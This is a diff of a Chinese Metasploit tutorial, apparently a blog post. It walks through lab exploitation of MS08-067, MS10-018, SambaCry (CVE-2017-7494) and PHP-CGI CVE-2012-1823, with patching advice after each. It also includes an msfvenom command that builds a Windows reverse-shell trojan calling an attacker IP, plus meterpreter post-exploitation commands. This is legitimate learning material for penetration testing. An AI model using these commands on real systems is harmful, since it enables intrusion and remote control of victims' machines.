@@ -9,8 +9,8 @@ tags:
   - 渗透测试
 description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494、CVE-2012-1823）及msfvenom木马生成
 ---
-# MSF 是什么？
-## 基础概述
+# 一、MSF 是什么？
+## (一) 基础概述
 **定义**：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
 
 **主要功能**：漏洞利用、生成攻击载荷、监听反弹连接、后渗透( 当攻击者**成功利用漏洞、拿到目标主机控制会话(Meterpreter)**之后，所执行的全部操作)； 常用组件为`msfconsole`交互控制台、`msfvenom`后门生成工具。  
@@ -19,9 +19,9 @@ description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-06
 `/usr/share/metasploit-framework/`
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737394842-b650945a-0e5d-48f2-8faf-e3c4a845a82f.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783737394842-b650945a-0e5d-48f2-8faf-e3c4a845a82f.png)
 
-## 核心目录分工
+## (二) 核心目录分工
 | 目录 | 核心作用 |
 | --- | --- |
 | modules | MSF核心武器库，存放所有渗透模块 |
@@ -31,9 +31,9 @@ description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-06
 | tools | 独立编码、漏洞分析小工具 |
 
 
-## modules六大子模块详解
+## (三) modules六大子模块详解
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737472585-4ae21c91-fc21-4de8-9332-08c6419e9f84.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783737472585-4ae21c91-fc21-4de8-9332-08c6419e9f84.png)
 
 ### Auxiliary 辅助模块
 + 目录：modules/auxiliary/
@@ -163,7 +163,7 @@ set SESSION 1		# 指定使用哪一条meterpreter会话
 run
 ```
 
-# MSF控制台基础命令
+# 二、MSF控制台基础命令
 | 命令 | 功能 |
 | --- | --- |
 | `msfconsole` | 启动MSF交互控制台 |
@@ -185,30 +185,30 @@ run
 1. msfconsole
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737947048-99dd459f-d218-4fe1-92bd-2b3c9b726bf4.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783737947048-99dd459f-d218-4fe1-92bd-2b3c9b726bf4.png)
 
 2. ？
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783737991704-b1e8b600-1994-4fe7-aaa5-315d770e83e8.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783737991704-b1e8b600-1994-4fe7-aaa5-315d770e83e8.png)
 
 3. earch
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738030387-49743920-f7ed-4c1b-bc4b-046e9b459077.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738030387-49743920-f7ed-4c1b-bc4b-046e9b459077.png)
 
 4. use
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738052954-a1685864-c24a-430b-909a-f93616ef5960.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738052954-a1685864-c24a-430b-909a-f93616ef5960.png)
 
 5. exit
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738074110-36591cde-d521-421d-9b45-77a9b0ea8aae.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738074110-36591cde-d521-421d-9b45-77a9b0ea8aae.png)
 
-# MSF 渗透测试
-## MS08-067
+# 三、MSF 渗透测试
+## (一) MS08-067
 ### 简介
 **MS08-067** 是Windows XP及部分旧版本Windows系统中著名的**远程代码执行漏洞**（CVE-2008-4250），存在于 **Server服务的RPC请求处理** 中。
 
@@ -242,7 +242,7 @@ exit
 **前提条件**：已知目标机的 IP 地址 192.168.23.136
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png)
 
 1. 启动 MSF 框架，准备攻击，执行 msfconsole 命令
 
@@ -251,7 +251,7 @@ msfconsole -q
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744671008-b3c596cb-0b58-4374-83d9-03cacae396e0.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783744671008-b3c596cb-0b58-4374-83d9-03cacae396e0.png)
 
 2. 加载漏洞模块，配置攻击参数
 
@@ -260,21 +260,21 @@ search MS08-067
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738968916-b22dc065-735d-493b-81e3-e67750404208.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738968916-b22dc065-735d-493b-81e3-e67750404208.png)
 
 ```bash
 use 0
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738993704-e744e1b7-cd33-4ef0-b866-b953e4e6f148.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738993704-e744e1b7-cd33-4ef0-b866-b953e4e6f148.png)
 
 ```bash
 show options
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739032687-96621e96-dd24-4fca-8a14-41a914c046bf.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783739032687-96621e96-dd24-4fca-8a14-41a914c046bf.png)
 
 设置目标 IP 地址
 
@@ -283,7 +283,7 @@ set RHOSTS 192.168.23.136
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752459192-37854255-0dfa-4cd5-b22b-e790e0e2f110.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752459192-37854255-0dfa-4cd5-b22b-e790e0e2f110.png)
 
 3. 执行攻击，获取系统权限。
 
@@ -292,14 +292,14 @@ run
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739099125-1a7dc7f7-3869-4ade-930f-83fe09aff2c3.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783739099125-1a7dc7f7-3869-4ade-930f-83fe09aff2c3.png)
 
 ```bash
 shell
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739152686-cab4f927-57a7-48cc-841f-28792445b680.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783739152686-cab4f927-57a7-48cc-841f-28792445b680.png)
 
 ### 防御
 + 安装KB958644补丁
@@ -307,7 +307,7 @@ shell
 + 部署**防火墙与入侵检测系统**，过滤异常RPC/SMB流量。
 + 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。
 
-## MS10-018 IE浏览器
+## (二) MS10-018 IE浏览器
 ### 简介
 MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 
 
@@ -347,7 +347,7 @@ exit
 **前提条件**：已知目标机的 IP 地址 192.168.23.136
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png)
 
 1. 启动 MSF ，准备攻击，执行 msfconsole 命令
 
@@ -356,7 +356,7 @@ msfconsole -q
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744682699-04252e42-4363-4588-a448-a92e77b658ae.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783744682699-04252e42-4363-4588-a448-a92e77b658ae.png)
 
 2. 加载漏洞模块
 
@@ -365,14 +365,14 @@ search MS10-018
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744826026-88b29f39-cee3-41d8-9f73-a42a5962c141.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783744826026-88b29f39-cee3-41d8-9f73-a42a5962c141.png)
 
 ```bash
 use 0
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744859186-f408059a-ccd7-4f23-9d63-10f584d58ae7.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783744859186-f408059a-ccd7-4f23-9d63-10f584d58ae7.png)
 
 3. 设置 payload 正向连接 shell
 
@@ -399,12 +399,12 @@ show options
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744915966-5ae1b79d-86c4-4a90-ae57-37d2f8135cd9.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783744915966-5ae1b79d-86c4-4a90-ae57-37d2f8135cd9.png)
 
 查看攻击机的 IP 192.168.23.131
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783745027849-e28047c2-f99a-4369-8966-83cb1b031476.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783745027849-e28047c2-f99a-4369-8966-83cb1b031476.png)
 
 设置攻击机的 IP 地址
 
@@ -413,7 +413,7 @@ set SRVHOST 192.168.23.131
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783745167156-87b91da3-eed7-4abb-920c-e10c1ab20d15.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783745167156-87b91da3-eed7-4abb-920c-e10c1ab20d15.png)
 
 修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口
 
@@ -427,7 +427,7 @@ set LPORT 9999
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747302463-53ec1ddc-5c20-4b63-b1a1-f2ec4b99b8b5.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747302463-53ec1ddc-5c20-4b63-b1a1-f2ec4b99b8b5.png)
 
 5. 启动攻击服务
 
@@ -436,17 +436,17 @@ run
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747335312-31c10fd7-867b-4e80-961d-95a335bb5fd3.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747335312-31c10fd7-867b-4e80-961d-95a335bb5fd3.png)
 
 出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。
 
 这里我们直接让目标机访问这个 url
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747561297-ef1e82a1-6e1d-464b-8e29-0aec25b3f22c.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747561297-ef1e82a1-6e1d-464b-8e29-0aec25b3f22c.png)
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747592673-fb8a94f5-56c7-4003-922f-1341d7f83d07.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747592673-fb8a94f5-56c7-4003-922f-1341d7f83d07.png)
 
 回车
 
@@ -457,7 +457,7 @@ sessions
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747753742-6ac22512-94cb-4c7c-933f-f353f6ee4a2b.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747753742-6ac22512-94cb-4c7c-933f-f353f6ee4a2b.png)
 
 进入这个会话 1（i 就是 in，1 表示会话的 id）
 
@@ -466,7 +466,7 @@ sessions -i 1
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747833392-2d70f72c-fc10-4593-bc04-33c809e3bb81.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783747833392-2d70f72c-fc10-4593-bc04-33c809e3bb81.png)
 
 出现 `meterpreter >` 提示符，**代表漏洞利用成功、已和受害机建立控制通道**，可以对目标进行操作。
 
@@ -477,14 +477,14 @@ shell
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783748060370-9e3d758b-0194-47ad-a189-6bf3c1c72cf9.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783748060370-9e3d758b-0194-47ad-a189-6bf3c1c72cf9.png)
 
 ### 防御
 + 安装KB980182补丁
 + 禁用危险ActiveX
 + 开启DEP/ASLR内存保护。
 
-## CVE-2017-7494 SambaCry（Linux永恒之蓝）
+## (三) CVE-2017-7494 SambaCry（Linux永恒之蓝）
 ### 简介
 CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  
 
@@ -520,7 +520,7 @@ su root
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751335503-dbb43a59-37a3-49a5-b5b1-a2029a2cda80.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783751335503-dbb43a59-37a3-49a5-b5b1-a2029a2cda80.png)
 
 提示符变为 `root@ubuntu#` 代表切换成功
 
@@ -535,7 +535,7 @@ docker-compose up -d
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751657051-2b7df133-4aef-47c8-bbd2-87dbd06015b7.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783751657051-2b7df133-4aef-47c8-bbd2-87dbd06015b7.png)
 
 注：实验结束，关闭销毁靶场
 
@@ -553,7 +553,7 @@ ifconfig
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751714301-3dcd4fe0-8ae4-40da-b572-f4a0e08763c4.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783751714301-3dcd4fe0-8ae4-40da-b572-f4a0e08763c4.png)
 
 3. 启动 MSF
 
@@ -562,7 +562,7 @@ msfconsole -q
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png)
 
 2. 搜索漏洞模块
 
@@ -571,7 +571,7 @@ search CVE-2017-7494
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752184408-3896dcc1-4217-4a93-a9d7-56a25ffc1e8d.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752184408-3896dcc1-4217-4a93-a9d7-56a25ffc1e8d.png)
 
 3. 加载SambaCry漏洞的攻击模块
 
@@ -580,7 +580,7 @@ use 0
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752209025-12b8b6d2-3239-463f-bd99-e6f7b0373bb2.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752209025-12b8b6d2-3239-463f-bd99-e6f7b0373bb2.png)
 
 4. 查看当前模块需要配置的参数
 
@@ -589,7 +589,7 @@ show options
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752244996-cc30a2be-711d-4eed-8a3c-1a3d69c0b26b.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752244996-cc30a2be-711d-4eed-8a3c-1a3d69c0b26b.png)
 
 5. 设置远程受害主机IP
 
@@ -598,7 +598,7 @@ set RHOSTS 192.168.23.135
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752529409-ac067c77-1164-43a4-98d3-d98552d9b787.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752529409-ac067c77-1164-43a4-98d3-d98552d9b787.png)
 
 6. 执行攻击
 
@@ -613,7 +613,7 @@ id
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752926788-547bc844-871c-486c-b6ec-86dfe100dcb6.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752926788-547bc844-871c-486c-b6ec-86dfe100dcb6.png)
 
 ### 防御
 + 升级Samba版本
@@ -621,7 +621,7 @@ id
 + 共享目录设只读
 + 防火墙限制445端口。
 
-##  CVE-2012-1823（PHP CGI漏洞利用）
+## (四) CVE-2012-1823（PHP CGI漏洞利用）
 ### 简介
 CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP < 5.3.12 和 PHP < 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现**源码泄露**或**任意代码**执行。  
 漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 = 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。
@@ -678,7 +678,7 @@ docker-compose config
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926151755-fa36c0ef-6438-4b90-9b59-b905bee2741e.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783926151755-fa36c0ef-6438-4b90-9b59-b905bee2741e.png)
 
 2. 启动 MSF
 
@@ -687,7 +687,7 @@ msfconsole -q
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png)
 
 2. 搜索漏洞模块
 
@@ -696,7 +696,7 @@ search CVE-2012-1823
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926437850-29aa71ba-8bc5-4dec-b2d8-74f248dc49db.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783926437850-29aa71ba-8bc5-4dec-b2d8-74f248dc49db.png)
 
 3. 加载漏洞攻击模块
 
@@ -705,7 +705,7 @@ use 0
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926467556-ecad250a-7bd1-4676-8579-a2db9b5e1fc2.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783926467556-ecad250a-7bd1-4676-8579-a2db9b5e1fc2.png)
 
 4. 查看当前模块需要配置的参数
 
@@ -714,12 +714,12 @@ show options
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927059110-0f5b4ed4-a910-4be3-917c-4c0f63157438.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783927059110-0f5b4ed4-a910-4be3-917c-4c0f63157438.png)
 
 5. 设置远程受害主机IP 和 端口
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926716659-60c24ea3-91aa-447d-840c-a79b6eaa2ab1.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783926716659-60c24ea3-91aa-447d-840c-a79b6eaa2ab1.png)
 
 ```bash
 set RHOSTS 192.168.23.135
@@ -727,7 +727,7 @@ set RPORT 8080
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926811086-015066ea-2208-425c-a89a-d21a5668d323.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783926811086-015066ea-2208-425c-a89a-d21a5668d323.png)
 
 6. 执行攻击
 
@@ -736,7 +736,7 @@ run
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927262636-51a44e10-afbc-4f6a-8794-a7f260371aa6.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783927262636-51a44e10-afbc-4f6a-8794-a7f260371aa6.png)
 
 7. 启动命令行
 
@@ -747,7 +747,7 @@ ip addr
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927620687-810609d7-a0ea-416d-9589-0ecb7ca867c8.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783927620687-810609d7-a0ea-416d-9589-0ecb7ca867c8.png)
 
 ### 防御
 + 升级 PHP 到 5.3.12、5.4.2 及以上安全版本；
@@ -756,30 +756,30 @@ ip addr
 + 使用低权限账号运行 PHP 程序；
 + 监控日志与进程行为，及时发现漏洞攻击尝试。
 
-## msfvenom 生成后门木马
-### Msfvenom 是什么？
+# 四、msfvenom 生成后门木马
+### (一) Msfvenom 是什么？
 Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
 
-### 使用场景
+### (二) 使用场景
 Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
 
-### 核心参数
+### (三) 核心参数
 1. -p 指定使用的攻击 payload（后门类型），例如`windows/meterpreter/reverse_tcp`
 2. LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
 3. LPORT 攻击机开启监听的端口
 4. -f 文件输出格式（elf、exe、so、raw 等）
 5. -o 保存生成的后门文件（output）
 
-### 基础语法
+### (四) 基础语法
 ```bash
 msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
 ```
 
-### Windows木马示例
+### (五) Windows木马示例
 1. 查看攻击机的 IP 192.168.23.131
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754748966-6817a6fb-0e6f-46b7-a215-eb3a95c72e16.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783754748966-6817a6fb-0e6f-46b7-a215-eb3a95c72e16.png)
 
 2. msfvenom 生成Windows反弹木马
 
@@ -794,10 +794,10 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.131 lport=9999 -f e
 + `> hello.exe`：将内容输出保存为hello.exe（等价 `-o hello.exe`）
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754860227-b7b82866-ca3f-479d-bdbe-543656da17c4.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783754860227-b7b82866-ca3f-479d-bdbe-543656da17c4.png)
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754951456-97075684-ae39-45c0-b7ca-93fc8c15a0f1.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783754951456-97075684-ae39-45c0-b7ca-93fc8c15a0f1.png)
 
 3. 监听
 
@@ -818,12 +818,12 @@ exploit -j
 + `exploit -j`：`-j` = job后台运行监听，不会占用当前窗口
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783755515865-5f972362-95b7-48a4-b387-8c716bb55047.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783755515865-5f972362-95b7-48a4-b387-8c716bb55047.png)
 
 4. 把木马放到靶机并运行hello.exe，成功得到meterpreter > 后执行
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756295981-6faab4ba-417a-45c4-93d2-4e85b689ae93.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783756295981-6faab4ba-417a-45c4-93d2-4e85b689ae93.png)
 
 5. 查看后台任务与对话
 
@@ -832,14 +832,14 @@ sessions
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756394425-75b10839-a585-45fb-99e2-a03600abed69.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783756394425-75b10839-a585-45fb-99e2-a03600abed69.png)
 
 ```bash
 sessions -i 1
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756492637-9e1b9422-44c1-4f64-8161-eb91f065d4e5.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783756492637-9e1b9422-44c1-4f64-8161-eb91f065d4e5.png)
 
 6. 实现远程控制
 
@@ -848,7 +848,7 @@ screenshot      # 对受害主机屏幕截图
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783757306533-da686ce9-9420-4215-b901-5ff7432e6d59.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783757306533-da686ce9-9420-4215-b901-5ff7432e6d59.png)
 
 ```bash
 shell           # 调出目标原生cmd命令行
@@ -856,12 +856,12 @@ ipconfig
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756667250-cdc947dd-3714-4ac4-87e5-5eb53cbb1228.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783756667250-cdc947dd-3714-4ac4-87e5-5eb53cbb1228.png)
 
 ```bash
 run vnc         # 开启VNC远程桌面控制
 ```
 
 <!-- 这是一张图片，ocr 内容为： -->
-![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783757219750-ec3aac1b-4599-45bc-8dd0-c93b013416aa.png)
+![](/img/posts/MSF的使用以及漏洞复现/1783757219750-ec3aac1b-4599-45bc-8dd0-c93b013416aa.png)
 
